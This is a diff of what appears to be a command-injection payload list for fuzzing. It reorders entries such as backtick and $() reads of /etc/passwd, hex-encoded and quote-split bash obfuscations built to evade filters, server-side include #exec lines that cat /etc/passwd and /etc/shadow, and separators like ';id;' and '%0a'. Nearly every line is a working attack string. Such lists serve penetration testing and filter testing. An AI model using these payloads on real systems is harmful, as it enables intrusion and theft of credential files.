@@ -1,29 +1,7 @@
-`cat /etc/passwd`
-$(cat /etc/passwd)
-cat</etc/passwd
-{cat,/etc/passwd}
-X=$'uname\x20-a'&&$X
-something%0Acat%20/etc/passwd
-cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
-`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
-cat `xxd -r -p <<< 2f6574632f706173737764`
-cat `xxd -r -ps <(echo 2f6574632f706173737764)`
-cat ${HOME:0:1}etc${HOME:0:1}passwd
-cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-w'h'o'am'i
-w"h"o"am"i
-w\ho\am\i
-/\b\i\n/////s\h
-who$@ami
-test=/ehhh/hmtc/pahhh/hmsswd
-cat ${test//hhh\/hm/}
-cat ${test//hh??hm/}
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id
 ;id;
 ;id
@@ -111,6 +89,27 @@ powershell C:\*\*2\n??e*d.*?
 '"
 "
 "'
+`cat /etc/passwd`
+$(cat /etc/passwd)
+cat</etc/passwd
+{cat,/etc/passwd}
+X=$'uname\x20-a'&&$X
+something%0Acat%20/etc/passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+w'h'o'am'i
+w"h"o"am"i
+w\ho\am\i
+/\b\i\n/////s\h
+who$@ami
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
 & 
 && 
 %0a
